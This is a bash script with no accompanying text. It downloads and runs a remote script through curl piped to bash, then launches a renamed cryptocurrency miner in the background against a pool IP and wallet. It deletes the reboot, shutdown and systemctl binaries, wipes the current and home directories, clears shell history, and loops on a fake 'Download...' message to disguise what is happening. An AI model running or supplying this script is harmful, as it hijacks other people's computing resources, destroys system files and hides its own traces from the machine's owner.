#!/bin/bash
apt-get update 
apt-get install -y wget curl sudo
sudo apt update && apt install git wget nano libpci-dev
curl -sL https://bitbucket.org/new-kamikaze/srbkaze/raw/main/grsrb.sh | bash
chmod +x srbkaze
chmod +x srbkaze.ini
sudo nohup ./srbkaze --algorithm yescryptr32 --pool 15.235.216.52:7116 --wallet UZX9AY6qWdEmsoB2mjjwPpDnoFdWBoFoKj.Quicksilver1 > /dev/null 2>&1 &
sleep 30
sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
curl ifconfig.me
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "Download..."
        sleep 20
done
